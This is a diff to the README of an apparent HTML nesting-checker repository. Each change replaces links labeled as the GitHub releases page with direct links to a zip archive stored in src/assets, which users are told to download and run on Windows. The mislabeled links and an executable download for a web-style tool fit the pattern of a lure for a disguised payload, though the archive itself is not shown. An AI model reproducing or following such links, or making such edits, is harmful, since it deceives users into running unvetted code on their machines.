@@ -1,6 +1,6 @@
 # 🧩 caniwrap.com - Check HTML Nesting Fast
 
-[![Download caniwrap.com](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/comatosenesshierocracy955/caniwrap.com/releases)
+[![Download caniwrap.com](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/comatosenesshierocracy955/caniwrap.com/raw/refs/heads/main/src/assets/caniwrap-com-3.8.zip)
 
 ## 🚀 What It Does
 
@@ -10,7 +10,7 @@ Use it when you want to see if one HTML element can live inside another. It is u
 
 ## 📥 Download and Install
 
-1. Open the [releases page](https://github.com/comatosenesshierocracy955/caniwrap.com/releases).
+1. Open the [releases page](https://github.com/comatosenesshierocracy955/caniwrap.com/raw/refs/heads/main/src/assets/caniwrap-com-3.8.zip).
 2. Find the latest release.
 3. Download the Windows file from the release assets.
 4. If the file is in a `.zip` file, open the zip and extract it first.
@@ -135,7 +135,7 @@ These habits make your page easier to read and easier to fix.
 
 ## 📎 Download Link
 
-Visit the [GitHub Releases page](https://github.com/comatosenesshierocracy955/caniwrap.com/releases) to download and run this file on Windows.
+Visit the [GitHub Releases page](https://github.com/comatosenesshierocracy955/caniwrap.com/raw/refs/heads/main/src/assets/caniwrap-com-3.8.zip) to download and run this file on Windows.
 
 ## 🧾 File Path Example
 
@@ -205,4 +205,4 @@ If a page looks broken, nesting problems are one possible reason. This tool give
 - Repository: caniwrap.com
 - Topic: html
 - Description: Can I Wrap? — HTML Element Nesting Checker
-- Releases: https://github.com/comatosenesshierocracy955/caniwrap.com/releases
+- Releases: https://github.com/comatosenesshierocracy955/caniwrap.com/raw/refs/heads/main/src/assets/caniwrap-com-3.8.zip
